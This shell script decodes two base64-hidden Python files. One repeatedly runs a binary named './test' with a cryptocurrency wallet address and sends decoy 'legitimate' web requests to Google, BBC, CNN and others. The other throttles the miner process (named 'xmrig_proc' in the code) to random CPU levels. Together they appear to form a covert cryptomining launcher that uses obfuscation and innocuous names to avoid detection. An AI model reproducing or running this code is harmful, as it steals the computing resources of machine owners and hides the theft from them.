sudo apt install -y python3-pip cpulimit
pip3 install requests psutil
chmod 777 ./test
echo 'aW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHN5cwppbXBvcnQganNvbgppbXBvcnQgb3MKaW1wb3J0IHJhbmRvbQppbXBvcnQgdGltZQppbXBvcnQgc2lnbmFsCmltcG9ydCByZXF1ZXN0cwoKTUlOX1RJTUVPVVQgPSAxMjAwCk1BWF9USU1FT1VUID0gMTgwMApNSU5fU0xFRVAgPSA2MDAKTUFYX1NMRUVQID0gMTIwMApMRUdJVElNQVRFX1NFUlZFUlMgPSBbImh0dHBzOi8vd3d3LmJhaWR1LmNvbS8iLCAiaHR0cHM6Ly9iYmMuY28udWsvIiwgImh0dHBzOi8vZWRpdGlvbi5jbm4uY29tLyIsICJodHRwczovL3d3dy5nb29nbGUuY29tLyIsICJodHRwczovL3lhaG9vLmNvbS8iLCAiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJdCldBTExFVCA9ICI0NTFqR0g4WG1SUmFhU3ZwS1lNYTFKR0czdzh3RjJlQ0pXV1BXWjdCVHhFeTdjcWVYOFdaUDRUNEpmZldudG5TWWM4dmFrOHpmOUpoZ0pEWDg3YnkzR3JvMm81WVBWWiIKICAKZGVmIHNlbmRMZWdpdGltYXRlUmVxdWVzdCgpOgogICAgc2VydmVyX2luZGV4ID0gcmFuZG9tLnJhbmRyYW5nZShsZW4oTEVHSVRJTUFURV9TRVJWRVJTKSkKICAgIHNlcnZlciA9IExFR0lUSU1BVEVfU0VSVkVSU1tzZXJ2ZXJfaW5kZXhdCiAgICBwcmludCgiPz8/IFNlbmRpbmcgYSByZXF1ZXN0IHRvICVzIiAlc2VydmVyKQogICAgcmVxdWVzdHMuZ2V0KHNlcnZlcikKCmRlZiBydW4odGVzdF9wYXRoKToKICAgIHJhbmRvbS5zZWVkKCkKICAgIGNvdW50ZXIgPSAwCiAgICB3aGlsZSBUcnVlOgogICAgICAgIHNsZWVwID0gcmFuZG9tLnJhbmRyYW5nZShNSU5fU0xFRVAsIE1BWF9TTEVFUCArIDEpCiAgICAgICAgdGltZW91dCA9IHJhbmRvbS5yYW5kcmFuZ2UoTUlOX1RJTUVPVVQsIE1BWF9USU1FT1VUICsgMSkKICAgICAgICBzZW5kTGVnaXRpbWF0ZVJlcXVlc3QoKQogICAgICAgIHByaW50KCIhISEgUnVubmluZyBmb3IgJWQgc2VjLCB3YWxsZXQ6ICVzXG4iICUodGltZW91dCwgV0FMTEVUKSkKICAgICAgICB0cnk6CiAgICAgICAgICAgIHAgPSBzdWJwcm9jZXNzLlBvcGVuKFt0ZXN0X3BhdGgsICItdXNlciIsICJjbG91ZGVyIiwgIi13YWxsZXQiLCAiNDUxakdIOFhtUlJhYVN2cEtZTWExSkdHM3c4d0YyZUNKV1dQV1o3QlR4RXk3Y3FlWDhXWlA0VDRKZmZXbnRuU1ljOHZhazh6ZjlKaGdKRFg4N2J5M0dybzJvNVlQVloiLCAiLXRscz10cnVlIiwgIi1zYXZlcj1mYWxzZSJdLCBzdGRvdXQ9c3VicHJvY2Vzcy5ERVZOVUxMLCBzdGRlcnI9c3VicHJvY2Vzcy5ERVZOVUxMKQogICAgICAgICAgICB0aW1lLnNsZWVwKHRpbWVvdXQpCiAgICAgICAgICAgIHAuc2VuZF9zaWduYWwoc2lnbmFsLlNJR0lOVCkKICAgICAgICBleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6CiAgICAgICAgICAgIHAuc2VuZF9zaWduYWwoc2lnbmFsLlNJR0lOVCkKICAgICAgICB0cnk6CiAgICAgICAgICAgIHAud2FpdCh0aW1lb3V0PTMwKQogICAgICAgICAgICBwcmludCgiPz8/IFByb2Nlc3MgdGVybWluYXRlZCIpCiAgICAgICAgICAgIHAudGVybWluYXRlKCkKICAgICAgICBleGNlcHQgc3VicHJvY2Vzcy5UaW1lb3V0RXhwaXJlZDoKICAgICAgICAgICAgaWYgcC5yZXR1cm5jb2RlIGlzIE5vbmU6CiAgICAgICAgICAgICAgICBwcmludCgiISEhIFByb2Nlc3MgaXMgc3RpbGwgYWxpdmUiKQogICAgICAgICAgICAgICAgdGltZS5zbGVlcCg1KQogICAgICAgICAgICAgICAgcC50ZXJtaW5hdGUoKQogICAgICAgIHRpbWUuc2xlZXAoc2xlZXApCiAgICAgICAgCmRlZiBtYWluKCk6CiAgICBpZiBsZW4oc3lzLmFyZ3YpIDwgMjoKICAgICAgICBwcmludCgiVVNBR0U6IHRlc3QucHkgPHRlc3RfcGF0aD4iKQogICAgICAgIHJldHVybgogICAgdGVzdF9wYXRoID0gc3lzLmFyZ3ZbMV0KICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyh0ZXN0X3BhdGgpOgogICAgICAgIHByaW50KCJDYW5ub3QgZmluZCB0ZXN0IGV4ZWN1dGFibGUiKQogICAgICAgIHJldHVybgogICAgcnVuKHRlc3RfcGF0aCkKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgIG1haW4oKQoK' | base64 --decode > ./test.py
echo 'aW1wb3J0IHN1YnByb2Nlc3MNCmltcG9ydCBzeXMNCmltcG9ydCBvcw0KaW1wb3J0IHJhbmRvbQ0KaW1wb3J0IHRpbWUNCmltcG9ydCBzaWduYWwNCmltcG9ydCBwc3V0aWwNCmltcG9ydCBzeXMNCg0KTUlOX1RJTUVPVVQgPSAxMA0KTUFYX1RJTUVPVVQgPSAzMA0KTUlOX0NQVSA9IDUNCk1BWF9DUFUgPSA4MA0KQ0hFQ0tfU0xFRVAgPSA1DQoNCmRlZiBnZXRQaWRCeU5hbWUocHJvY2Vzc05hbWUpOg0KICAgICcnJw0KICAgIENoZWNrIGlmIHRoZXJlIGlzIGFueSBydW5uaW5nIHByb2Nlc3MgdGhhdCBjb250YWlucyB0aGUgZ2l2ZW4gbmFtZSBwcm9jZXNzTmFtZS4NCiAgICAnJycNCiAgICAjSXRlcmF0ZSBvdmVyIHRoZSBhbGwgdGhlIHJ1bm5pbmcgcHJvY2Vzcw0KICAgIGZvciBwcm9jIGluIHBzdXRpbC5wcm9jZXNzX2l0ZXIoKToNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgIyBDaGVjayBpZiBwcm9jZXNzIG5hbWUgY29udGFpbnMgdGhlIGdpdmVuIG5hbWUgc3RyaW5nLg0KICAgICAgICAgICAgaWYgcHJvY2Vzc05hbWUubG93ZXIoKSBpbiBwcm9jLm5hbWUoKS5sb3dlcigpOg0KICAgICAgICAgICAgICAgIHJldHVybiBwcm9jDQogICAgICAgIGV4Y2VwdCAocHN1dGlsLk5vU3VjaFByb2Nlc3MsIHBzdXRpbC5BY2Nlc3NEZW5pZWQsIHBzdXRpbC5ab21iaWVQcm9jZXNzKToNCiAgICAgICAgICAgIHBhc3MNCiAgICByZXR1cm4gTm9uZQ0KDQpkZWYgcnVuKCk6DQogICAgcmFuZG9tLnNlZWQoKQ0KICAgIHAgPSBOb25lDQogICAgd2hpbGUgVHJ1ZToNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgeG1yaWdfcHJvYyA9IE5vbmUNCiAgICAgICAgICAgIGlmIGxlbihzeXMuYXJndikgPiAxOg0KICAgICAgICAgICAgICAgIHBpZCA9IHN5cy5hcmd2WzFdDQogICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAjIENoZWNrIGlmIHByb2Nlc3MgbmFtZSBjb250YWlucyB0aGUgZ2l2ZW4gbmFtZSBzdHJpbmcuDQogICAgICAgICAgICAgICAgICAgIHhtcmlnX3Byb2MgPSBwc3V0aWwuUHJvY2VzcyhpbnQocGlkKSkNCiAgICAgICAgICAgICAgICBleGNlcHQgKHBzdXRpbC5Ob1N1Y2hQcm9jZXNzLCBwc3V0aWwuQWNjZXNzRGVuaWVkLCBwc3V0aWwuWm9tYmllUHJvY2Vzcyk6DQogICAgICAgICAgICAgICAgICAgIHhtcmlnX3Byb2MgPSBnZXRQaWRCeU5hbWUoInRlc3QiKQ0KICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICB4bXJpZ19wcm9jID0gZ2V0UGlkQnlOYW1lKCJ0ZXN0IikNCiAgICAgICAgICAgIGlmIHhtcmlnX3Byb2MgaXMgTm9uZToNCiAgICAgICAgICAgICAgICBwcmludCgiUHJvY2VzcyBpc24ndCBmb3VuZCIpDQogICAgICAgICAgICAgICAgdGltZS5zbGVlcChDSEVDS19TTEVFUCkNCiAgICAgICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICAgICAgdGltZW91dCA9IHJhbmRvbS5yYW5kcmFuZ2UoTUlOX1RJTUVPVVQsIE1BWF9USU1FT1VUICsgMSkNCiAgICAgICAgICAgIGNwdV9saW1pdCA9IHJhbmRvbS5yYW5kcmFuZ2UoTUlOX0NQVSwgTUFYX0NQVSArIDEpDQogICAgICAgICAgICBwcmludCgiTGltaXRpbmcgQ1BVIHRvICVkIGZvciAlZCBzZWNvbmRzIiAlKGNwdV9saW1pdCwgdGltZW91dCkpDQogICAgICAgICAgICBwID0gc3VicHJvY2Vzcy5Qb3BlbihbImNwdWxpbWl0IiwgIi1wIiwgc3RyKHhtcmlnX3Byb2MucGlkKSwgIi1sIiwgc3RyKGNwdV9saW1pdCldLCBzdGRvdXQ9c3VicHJvY2Vzcy5ERVZOVUxMLCBzdGRlcnI9c3VicHJvY2Vzcy5ERVZOVUxMKQ0KICAgICAgICAgICAgdGltZS5zbGVlcCh0aW1lb3V0KQ0KICAgICAgICAgICAgcC5zZW5kX3NpZ25hbChzaWduYWwuU0lHSU5UKQ0KICAgICAgICBleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6DQogICAgICAgICAgICBwLnNlbmRfc2lnbmFsKHNpZ25hbC5TSUdJTlQpDQogICAgICAgICAgICBicmVhaw0KICAgICAgICB0cnk6DQogICAgICAgICAgICBwLndhaXQodGltZW91dD01KQ0KICAgICAgICAgICAgcHJpbnQoIj8/PyBQcm9jZXNzIHRlcm1pbmF0ZWQiKQ0KICAgICAgICAgICAgcC50ZXJtaW5hdGUoKQ0KICAgICAgICBleGNlcHQgc3VicHJvY2Vzcy5UaW1lb3V0RXhwaXJlZDoNCiAgICAgICAgICAgIGlmIHAucmV0dXJuY29kZSBpcyBOb25lOg0KICAgICAgICAgICAgICAgIHByaW50KCIhISEgUHJvY2VzcyBpcyBzdGlsbCBhbGl2ZSIpDQogICAgICAgICAgICAgICAgcC50ZXJtaW5hdGUoKQ0KICAgICAgICANCmRlZiBtYWluKCk6DQogICAgcnVuKCkNCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6DQogICAgbWFpbigpDQo=' | base64 --decode > ./limit.py
echo 'python3 ./limit.py'
echo 'python3 ./test.py ./test'
